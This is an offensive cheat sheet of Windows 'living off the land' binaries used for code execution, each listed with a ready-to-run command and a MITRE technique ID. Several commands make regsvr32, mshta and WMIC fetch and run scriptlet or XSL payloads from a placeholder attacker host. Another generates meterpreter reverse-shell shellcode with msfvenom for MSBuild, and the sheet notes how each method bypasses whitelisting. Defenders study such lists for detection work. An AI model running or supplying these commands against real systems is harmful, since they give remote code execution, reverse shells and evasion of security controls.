# LOLBins Code Execution

## MSBuild (T1127)
```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
- XML contains inline C# with shellcode; compiles and executes in memory
- Generate shellcode: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 -f csharp`

## regsvr32 / Squiblydoo (T1117)
```cmd
regsvr32.exe /s /i:http://ATTACKER/back.sct scrobj.dll
```
- Loads remote .sct scriptlet containing JScript payload
- Process exits quickly after execution

## MSHTA (T1170)
```cmd
mshta.exe javascript:a=(GetObject("script:http://ATTACKER/m.sct")).Exec();close();
```
- Executes remote scriptlet via mshta.exe (HTML Application Host)

## CMSTP (T1191)
```cmd
cmstp.exe /s /ns c:\path\evil.inf
```
- .inf file RegisterOCXs section loads malicious DLL

## InstallUtil (T1118)
```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe payload.cs
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
```
- Executes code in Uninstall() method, bypasses whitelisting

## Forfiles (T1202)
```cmd
forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe
```
- Indirect command execution without cmd.exe as parent

## WMIC + XSL
```cmd
wmic os get /FORMAT:"http://ATTACKER/evil.xsl"
```
- XSL file contains JScript payload; spawns under svchost.exe

## Control Panel Items (T1196)
- Compile DLL exporting `CPlApplet`; rename to .cpl
- Execute: `control.exe evil.cpl` or double-click
